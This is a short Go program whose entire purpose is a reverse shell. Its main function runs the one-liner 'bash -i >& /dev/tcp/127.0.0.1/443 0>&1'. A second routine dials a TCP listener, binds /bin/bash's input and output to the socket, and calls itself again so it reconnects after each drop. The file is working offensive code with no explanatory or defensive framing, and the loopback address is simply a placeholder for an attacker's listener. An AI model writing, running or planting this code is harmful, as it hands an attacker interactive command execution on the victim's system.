package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
)

// When you expect an output
func executeCommands(commands string) {
	parts := strings.Fields(commands)

	// structuring the command order
	head := parts[0]
	parts = parts[1:]
	out := exec.Command(head, parts...).Run()

	fmt.Print(out)
}

func executeBlindCommands() {

	binBash := "/bin/bash"
	connect, err := net.Dial("tcp", "127.0.0.1:443")
	if err != nil {
		log.Fatal("something went wrong")
	}
	cmd := exec.Command(binBash)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = connect, connect, connect
	cmd.Run()
	connect.Close()
	executeBlindCommands()
}

func main() {

	executeCommands("bash -c 'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'")
	//executeBlindCommands()

	// err := exec.Command("bash -c", "'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'").Run()
	// if err != nil {
	// 	log.Fatal("Something went wrong")
	// 	fmt.Println(err)
	// }
}
